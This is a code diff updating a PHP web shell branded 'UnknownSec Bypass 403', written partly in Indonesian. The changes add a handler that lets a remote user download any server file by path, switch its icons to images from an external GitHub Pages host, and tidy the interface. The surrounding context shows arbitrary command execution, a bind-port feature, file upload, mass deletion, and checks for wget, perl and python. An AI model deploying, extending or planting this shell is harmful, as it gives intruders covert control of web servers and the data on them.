@@ -9,7 +9,19 @@ error_reporting(0);
 @ini_set('max_execution_time',0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
-
+$name = 'UnknownSec';
+$style = "<style>table{display:none;}</style>";
+if(isset($_GET['option']) && $_POST['opt'] == 'download'){
+	header('Content-type: text/plain');
+	header('Content-Disposition: attachment; filename="'.$_POST['name'].'"');
+echo(file_get_contents($_POST['path']));
+exit();
+}
+if(get_magic_quotes_gpc()){
+    foreach($_POST as $key=>$value){
+        $_POST[$key] = stripslashes($value);
+    }
+}
 function uns($dir,$ps) {
 if (isset($_GET['path'])) {
 	$lokasi = $_GET['path'];
@@ -99,24 +111,25 @@ $if .= (($ps & 0x0001) ?
 (($ps & 0x0200) ? 't' : 'x' ) :
 (($ps & 0x0200) ? 'T' : '-'));
 return $if;
+exit();
 	}
-echo '
+echo "
 <!DOCTYPE HTML>
 <html>
 	<head>
-		<meta name="author" content="UnknownSec">
-		<meta name="robots" content="NOINDEX, NOFOLLOW">
-		<meta name="viewport" content="width=device-width, initial-scale=0.70, user-scalable=no">
-		<title>'.$_SERVER['HTTP_HOST'].' - Bypass 403</title>
-		<link rel="stylesheet" href="//unknownsec1337.github.io/main/style.css" type="text/css">
+		<meta name='author' content='$name'>
+		<meta name='robots' content='NOINDEX, NOFOLLOW'>
+		<title>".$_SERVER['HTTP_HOST']." - $name 403</title>
+		<meta name='viewport' content='width=device-width, initial-scale=0.60, user-scalable=no'>
+		<link rel='stylesheet' href='//unknownsec1337.github.io/main/style.css' type='text/css'>
 	</head>
 <body>
-<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
-<script src="//cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.33.1/sweetalert2.min.js"></script>
-<div class="container">
-	<div class="card text-dark">
-		<div class="card-header">
-			<a href="?"><h4>UnknownSec Bypass <i class="fas fa-biohazard"></i> 403</h4></a>';
+<script src='//maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js'></script>
+<script src='//cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.33.1/sweetalert2.min.js'></script>
+<div class='container'>
+	<div class='card text-dark'>
+		<div class='card-header'>
+			<a href='?'><h4>$name Bypass <i class='fas fa-biohazard'></i> 403</h4></a>";
 			if(isset($_GET['path'])){
 				$path = $_GET['path'];
 			}else{
@@ -223,13 +236,17 @@ if($_POST['start']) {
 		echo "</div>";
 	}
 } else {
-echo "<br /><style>table{display:none;}</style>
+echo "<br />$style
 <form method='post'>
-<center>
 	<b>Tipe:</b><br>
-	<div style='border: 2px solid #fff; border-radius:10px; width: 30%;'/>
-	<input type='radio' name='tipe' value='biasa' checked>Biasa<input type='radio' name='tipe' value='massal'>Massal</div>
-	</center>
+<div class='custom-control custom-switch'>
+	<input type='checkbox' id='customSwitch' class='custom-control-input' name='tipe' value='biasa'>
+	<label class='custom-control-label' for='customSwitch'>Biasa</label>
+</div>
+<div class='custom-control custom-switch'>
+	<input type='checkbox' id='customSwitch1' class='custom-control-input' name='tipe' value='massal'>
+	<label class='custom-control-label' for='customSwitch1'>Massal</label>
+</div>
 	<b><i class='far fa-folder'></i> Lokasi:</b>
 	<input class='form-control' type='text' name='d_dir' value='$dir' height='10'>
 	<b><i class='far fa-file-alt'></i> File name:</b>
@@ -241,7 +258,7 @@ echo "<br /><style>table{display:none;}</style>
 	}
 }
 elseif($_GET['id'] == 'nt'){
-echo "<br /><style>table{display:none;}</style>
+echo "<br />$style
 <form method='post'>
 	<u>Bind Port :</u>
 	<br><b>PORT :</b>
@@ -297,7 +314,7 @@ $wget = (exe('wget --help')) ? "<font color=green>ON</font>" : "<font color=red>
 $perl = (exe('perl --help')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
 $python = (exe('python --help')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
 $sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=green>OFF</font>";
-echo '<br /><style>table{display:none;}</style>
+echo '<br />'.$style.'
 <div class="container">
 	<div class="card text-dark">
 		<div class="card-header">';
@@ -314,7 +331,7 @@ echo "<b>MySQL:</b> $mysql | <b>Perl:</b> $perl | <b>Python:</b> $python | <b>WG
 </div>';
 }
 elseif($_GET['id'] == 'ab'){
-echo '<br /><style>table{display:none;}</style>
+echo '<br />'.$style.'
 <div class="container">
 	<div class="card text-dark">
 		<div class="card-header">';
@@ -326,7 +343,7 @@ echo "Thanks bre dah pake shell nya, jika ada yang error silahkan hubungi email 
 </div>';
 }
 elseif($_GET['id'] == 'cm') {
-	echo "<br /><style>table{display:none;}</style>
+	echo "<br />$style
 <form method='post'>
 	<div class='input-group mb-3'>
 		<input type='text' class='form-control' name='cmd'>
@@ -340,7 +357,7 @@ echo "<textarea class='form-control' rows='7'>".exe($_POST['cmd'])."</textarea>"
 	}
 }
 elseif($_GET['id'] == 'up'){
-echo '<br /><style>table{display:none;}</style>
+echo '<br />'.$style.'
 <form method="post" enctype="multipart/form-data">
 	<div class="input-group mb-3">
 		<div class="custom-file">
@@ -406,7 +423,7 @@ echo "<div style='margin: 5px auto; padding: 5px'>";
 	hapus_massal($_POST['d_dir'], $_POST['d_file']);
 echo "</div>";
 } else {
-echo "<br /><style>table{display:none;}</style>
+echo "<br />$style
 <form method='post'>
 	<b><i class='far fa-folder'></i> Lokasi:</b>
 	<input class='form-control' type='text' name='d_dir' value='$dir' height='10'>
@@ -595,10 +612,8 @@ Swal.fire(
 ).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
 ';
 }
+	}
 }
-}
-?>
-<?php
 echo '</center>';
 $scandir = scandir($path);
 $pa = getcwd();
@@ -614,7 +629,7 @@ echo '<div class="container-fluid"><table class="table table-striped table-borde
 foreach($scandir as $dir){
 if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
 	echo "<tr>
-<td><i class='far fa-folder'></i><a href=\"?path=$path/$dir\"> $dir</a></td>
+<td><img class='ico' src='//unknownsec1337.github.io/icon/folder.png'><a href=\"?path=$path/$dir\"> $dir</a></td>
 	<td><font><center>DIR</center></font></td>
 <td><center>";
 if(is_writable("$path/$dir")) echo '<font color="green">';
@@ -652,28 +667,62 @@ foreach($scandir as $file){
 		$size = $size.' KB';
 	}
 echo '<tr>
-		<td><i class="';
+		<td><img src="';
 	$ex = strtolower(pathinfo($file, PATHINFO_EXTENSION));
-	if($ex == "html" || $ex == "css" || $ex == "php" || $ex == "txt" || $ex == "js" || $ex == "sql" || $ex == "py" || $ex == "sh" || $ex == "pl" || $ex == "md" || $ex == "json" || $ex == "htm" || $ex == "ini") {
-		echo 'far fa-file-code';
+	if($ex == "htaccess") {
+		echo '//unknownsec1337.github.io/icon/htaccess.png';
 	}elseif($ex == "png" || $ex == "jpg" || $ex == "jpeg" || $ex == "gif" || $ex == "ico"){
-		echo 'far fa-file-image';
-	}elseif($ex == "zip" || $ex == "rar"){
-		echo 'far fa-file-archive';
-	}elseif($ex == "pdf"){
-		echo 'far fa-file-pdf';
-	}elseif($ex == "htaccess"){
-		echo 'fas fa-cogs';
+		echo '//unknownsec1337.github.io/icon/images.png';
+	}elseif($ex == "php"){
+		echo '//unknownsec1337.github.io/icon/php.png';
+		}elseif($ex == "ini"){
+		echo '//unknownsec1337.github.io/icon/ini.png';
+	}elseif($ex == "html"){
+		echo '//unknownsec1337.github.io/icon/html.png';
+	}elseif($ex == "js"){
+		echo '//unknownsec1337.github.io/icon/js.png';
+	}elseif($ex == "css"){
+		echo '//unknownsec1337.github.io/icon/css.png';
+	}elseif($ex == "json"){
+		echo '//unknownsec1337.github.io/icon/json.png';
+	}elseif($ex == "txt"){
+		echo '//unknownsec1337.github.io/icon/txt.png';
+	}elseif($ex == "sql"){
+		echo '//unknownsec1337.github.io/icon/sql.png';
+	}elseif($ex == "py"){
+		echo '//unknownsec1337.github.io/icon/py.png';
+	}elseif($ex == "pl"){
+		echo '//unknownsec1337.github.io/icon/pl.png';
+	}elseif($ex == "dat"){
+		echo '//unknownsec1337.github.io/icon/dat.png';
+	}elseif($ex == "md"){
+		echo '//unknownsec1337.github.io/icon/md.png';
+	}elseif($ex == "sh"){
+		echo '//unknownsec1337.github.io/icon/sh.png';
+	}elseif($ex == "zip"){
+		echo '//unknownsec1337.github.io/icon/zip.png';
+	}elseif($ex == "rar"){
+		echo '//unknownsec1337.github.io/icon/rar.png';
+	}elseif($ex == "xls"){
+		echo '//unknownsec1337.github.io/icon/xls.png';
+	}elseif($ex == "excel"){
+		echo '//unknownsec1337.github.io/icon/excel.png';
+	}elseif($ex == "word"){
+		echo '//unknownsec1337.github.io/icon/word.png';
+	}elseif($ex == "doc"){
+		echo '//unknownsec1337.github.io/icon/doc.png';
 	}elseif($ex == "mp4"){
-		echo 'far fa-file-video';
+		echo '//unknownsec1337.github.io/icon/mp4.png';
 	}elseif($ex == "mp3"){
-		echo 'far fa-file-audio';
-	}elseif($ex == "excel" || $ex == "word"){
-		echo 'far fa-file-excel';
+		echo '//unknownsec1337.github.io/icon/mp3.png';
+	}elseif($ex == "pdf"){
+		echo '//unknownsec1337.github.io/icon/pdf.png';
+	}elseif($ex == "csv"){
+		echo '//unknownsec1337.github.io/icon/csv.png';
 	}else{
-		echo 'far fa-file-alt';
+		echo '//unknownsec1337.github.io/icon/dflt.png';
 	}
-echo '"</i>';
+echo '" class="ico">';
 	echo "<a href=\"?filesrc=$path/$file&path=$path\"> $file</a></td>
 	<td><font><center>".$size."</center></font></td>
 <td><center>";
@@ -690,7 +739,8 @@ if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
 		<option value=\"delete\">Delete</option>
 		<option value=\"edit\">Edit</option>
 		<option value=\"rename\">Rename</option>
-	<option value=\"chmod\">Chmod</option>
+		<option value=\"chmod\">Chmod</option>
+	<option value=\"download\">Download</option>
 </select>
 	<input type=\"hidden\" name=\"type\" value=\"file\">
 		<input type=\"hidden\" name=\"name\" value=\"$file\">
@@ -710,7 +760,7 @@ echo "
 <div class='container'>
 	<div class='card text-dark'>
 		<div class='card-header'>
-			<center><font>Copyright &copy; ".date("Y")." - <a href=''>UnknownSec</a></center>
+			<center><font>Copyright &copy; ".date("Y")." - <a href=''>$name</a></center>
 		</div>
 	</div>
 </div>
